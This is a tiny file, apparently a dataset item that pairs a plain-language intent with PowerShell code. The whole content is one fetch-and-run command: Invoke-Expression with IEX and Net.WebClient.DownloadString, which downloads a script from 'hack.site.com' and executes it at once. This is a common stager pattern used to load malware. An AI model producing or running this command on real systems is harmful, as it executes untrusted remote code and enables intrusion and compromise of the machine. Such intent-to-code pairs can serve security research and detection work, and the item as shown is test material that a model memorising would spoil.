# Natural language intent:
# Downloads and executes a PowerShell script from a specified URL using Invoke-Expression.

Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://hack.site.com/code.ps1')"
